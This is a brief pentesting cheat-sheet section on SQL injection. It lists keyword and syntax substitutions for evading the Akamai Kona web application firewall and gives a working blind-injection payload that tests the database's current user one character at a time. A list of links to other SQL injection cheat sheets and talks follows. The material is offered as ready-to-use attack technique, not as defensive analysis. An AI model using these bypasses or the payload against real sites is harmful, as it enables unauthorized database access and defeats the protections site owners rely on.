## SQLI

**Akamai Kona Bypass**

* `MID` instead of `SUBSTRING`
* `LIKE` instead of `=`
* `/**/` instead of a `space`
* `CURRENT_USER` instead of `CURRENT_USER()`
* ` "` instead of `'`

Final example: 

```sql
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

**Blogs**

* http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/
* http://isc.sans.edu/diary.html?storyid=9397
* http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
* http://xd-blog.com.ar/descargas/manuales/bugs/full-mssql-injection-pwnage.html
* http://securityoverride.com/articles.php?article_id=1&article=The_Complete_Guide_to_SQL_Injections
* http://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
* http://sqlzoo.net/hack/
* http://www.sqlteam.com/article/sql-server-versions
* http://www.krazl.com/blog/?p=3
* http://www.owasp.org/index.php/Testing_for_MS_Access
* http://web.archive.org/web/20101112061524/http://seclists.org/pen-test/2003/May/0074.html
* http://web.archive.org/web/20080822123152/http://www.webapptest.org/ms-access-sql-injection-cheat-sheet-EN.html
* http://www.youtube.com/watch?v=WkHkryIoLD0
* http://layerone.info/archives/2009/Joe%20McCray%20-%20Advanced%20SQL%20Injection%20-%20L1%202009.pdf
* http://vimeo.com/3418947
* http://sla.ckers.org/forum/read.php?24,33903
* http://websec.files.wordpress.com/2010/11/sqli2.pdf
* http://old.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/
* http://ha.ckers.org/sqlinjection/
* http://lab.mediaservice.net/notes_more.php?id=MSSQL
